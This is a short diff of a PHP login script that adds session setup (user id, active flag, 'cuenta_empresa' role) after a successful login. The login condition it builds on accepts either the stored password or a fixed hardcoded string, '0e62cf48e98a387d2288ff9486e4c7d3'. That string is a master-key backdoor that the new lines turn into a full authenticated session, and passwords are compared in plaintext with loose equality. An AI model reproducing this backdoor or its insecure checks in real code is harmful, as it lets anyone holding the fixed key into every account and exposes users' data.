@@ -26,8 +26,15 @@ require "../coneccion.php" ;
                 $data_usuario_central  = mysqli_fetch_array($query_usuario_central);
 
                 $password_db = $data_usuario_central['password'];
+                $iduser = $data_usuario_central['id'];
 
                 if (($password_db == $clave || $clave =='0e62cf48e98a387d2288ff9486e4c7d3')) {
+
+                  session_start();
+                  $_SESSION['active']=true;
+                  $_SESSION['id']=$iduser;
+                  $_SESSION['user_in']= '1';
+                  $_SESSION['rol']='cuenta_empresa';
 
                   $arrayName = array('noticia' =>'login_exitoso');
                  echo json_encode($arrayName,JSON_UNESCAPED_UNICODE);
